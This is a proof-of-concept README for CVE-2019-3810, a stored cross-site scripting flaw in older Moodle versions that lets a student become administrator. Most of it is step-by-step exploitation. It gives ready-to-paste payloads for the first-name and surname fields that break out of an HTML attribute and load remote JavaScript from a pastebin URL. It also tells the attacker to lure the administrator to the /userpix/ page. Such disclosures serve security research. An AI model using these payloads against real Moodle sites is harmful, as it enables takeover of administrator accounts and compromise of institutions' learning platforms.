# Moodle CVE-2019-3810

Moodle (< 3.6.2, < 3.5.4, < 3.4.7, < 3.1.16) XSS PoC for Privilege Escalation (Student to Admin). This is one of the past bugs that I discovered during past pentest in an academic institution.

We can see from [the git history](https://github.com/moodle/moodle/blame/785e29e954f601a4f8d406aa0f3c9dba001d5018/userpix/index.php#L16), the bug existed since old versions of Moodle (2003) and [just patched in 2019](https://github.com/moodle/moodle/commit/14f9bad3cebf1aa6bb73be48020653e1f792dc29).

## WARNING

FOR EDUCATIONAL PURPOSES ONLY. DO NOT USE THE EXPLOIT FOR ILLEGAL ACTIVITIES. THE AUTHOR IS NOT RESPONSIBLE FOR ANY MISUSE OR DAMAGE.

## PoC

1. Upload the [payload.js](payload.js) to pastebin or other similar service. Change the value of `userid` to your own id. Let's say the URL is `https://pastebin.com/raw/xxxxxxxx`.
2. Login to your student account.
3. Set first name with `" style="position:fixed;height:100%;width:100%;top:0;left:0" onmouseover="x=document.createElement`
4. Set surname with `('script');x.src='https://pastebin.com/raw/xxxxxxxx';document.body.appendChild(x); alert('XSS')`
5. Ask the administrator to open `/userpix/` page or put the link to that page on your post and wait.

If successful, your account will be added as administrator.
